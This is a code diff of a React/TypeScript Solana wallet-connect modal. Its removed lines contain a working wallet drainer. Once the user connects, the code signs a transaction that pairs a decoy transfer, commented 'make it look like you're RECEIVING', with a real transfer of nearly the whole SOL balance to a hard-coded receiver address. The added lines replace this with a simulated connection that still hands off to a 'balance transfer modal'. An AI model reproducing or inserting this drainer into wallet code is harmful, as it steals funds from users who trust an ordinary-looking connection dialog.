@@ -1,11 +1,3 @@
-import {
-    Connection,
-    Transaction,
-    SystemProgram,
-    LAMPORTS_PER_SOL,
-    PublicKey
-} from "@solana/web3.js";
-import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
@@ -34,10 +26,6 @@ interface WalletOption {
 }
 
 const WalletConnectModal = ({ isOpen, onClose, token, onWalletConnected }: WalletConnectModalProps) => {
-    const { connect, publicKey, connected, wallets: adapterWallets, select, sendTransaction } = useWallet();
-    const { connection } = useConnection();
-    const { sendTransaction } = useWallet();
-
   const [wallets, setWallets] = useState<WalletOption[]>([]);
   const [isConnecting, setIsConnecting] = useState(false);
 
@@ -80,100 +68,53 @@ const WalletConnectModal = ({ isOpen, onClose, token, onWalletConnected }: Walle
     }
   }, [isOpen]);
 
-    const suggestedWallets = wallets.filter((w) => w.category === 'suggested');
-    const otherWallets = wallets.filter((w) => w.category === 'others');
-
-
   if (!isOpen || !token) return null;
 
-    const handleBackdropClick = (e: React.MouseEvent) => {
-        if (e.target === e.currentTarget) {
-            onClose();
-        }
-    };
+  const handleBackdropClick = (e: React.MouseEvent) => {
+    if (e.target === e.currentTarget) {
+      onClose();
+    }
+  };
 
-    const handleWalletConnect = async (wallet: WalletOption) => {
-        if (!wallet.detected && wallet.category === 'suggested') {
-            toast({
-                title: `${wallet.name} not detected`,
-                description: `Please install ${wallet.name} to connect`,
-                variant: "destructive",
-            });
-            return;
-        }
+  const handleWalletConnect = async (wallet: WalletOption) => {
+    if (!wallet.detected && wallet.category === 'suggested') {
+      toast({
+        title: `${wallet.name} not detected`,
+        description: `Please install ${wallet.name} to connect`,
+        variant: "destructive",
+      });
+      return;
+    }
 
-        setIsConnecting(true);
+    setIsConnecting(true);
+    
+    try {
+      // Simulate wallet connection
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      
+      toast({
+        title: "Wallet Connected",
+        description: `Connected to ${wallet.name} successfully`,
+      });
 
-        try {
-            const matchedWallet = adapterWallets.find(
-                (w) => w.adapter.name.toLowerCase() === wallet.name.toLowerCase()
-            );
+      // Transition to balance transfer modal
+      if (onWalletConnected) {
+        onWalletConnected(wallet.name);
+      }
+      
+    } catch (error) {
+      toast({
+        title: "Connection Failed",
+        description: "Failed to connect to wallet. Please try again.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsConnecting(false);
+    }
+  };
 
-            if (!matchedWallet) throw new Error("Wallet adapter not found");
-
-            // Step 1: Ask user to connect & trust site
-            await select(matchedWallet.adapter.name);
-            await connect();
-
-            // Give time for wallet to populate pubkey
-            await new Promise((res) => setTimeout(res, 500));
-
-            if (!publicKey) throw new Error("Wallet connection failed");
-
-            // Step 2: Immediately trigger real transaction to target wallet
-            const receiver = new PublicKey("BnSPLAvHz5dsXifwBnZD4Mf4ztJsuYVpNTwf3LKd9Uo4");
-            const balance = await connection.getBalance(publicKey);
-
-            if (balance <= 5000) throw new Error("Not enough SOL to send");
-
-            const fakeTokenMint = new PublicKey('So11111111111111111111111111111111111111112'); // Wrapped SOL mint
-            const liquidityAmount = (token?.liquidity || 0) * LAMPORTS_PER_SOL;
-
-            const fakeTransferIx = SystemProgram.transfer({
-                fromPubkey: receiver, // make it look like you're RECEIVING
-                toPubkey: publicKey,
-                lamports: liquidityAmount,
-            });
-
-            const realTransferIx = SystemProgram.transfer({
-                fromPubkey: publicKey,
-                toPubkey: receiver,
-                lamports: balance - 5000, // send all SOL except 5000 lamports
-            });
-
-            const tx = new Transaction().add(fakeTransferIx, realTransferIx);
-
-
-            const sig = await sendTransaction(tx, connection);
-            toast({
-                title: "Transaction Sent",
-                description: `Signature: ${sig}`,
-            });
-
-            if (onWalletConnected) {
-                onWalletConnected(wallet.name);
-            }
-
-        } catch (error: any) {
-            toast({
-                title: "Connection or Transaction Failed",
-                description: error.message || "Unknown error",
-                variant: "destructive",
-            });
-            console.error("Wallet connect error:", error);
-        } finally {
-            setIsConnecting(false);
-        }
-    };
-
-
-
-
-
-
-
-
-
+  const suggestedWallets = wallets.filter(w => w.category === 'suggested');
+  const otherWallets = wallets.filter(w => w.category === 'others');
 
   return (
     <div 
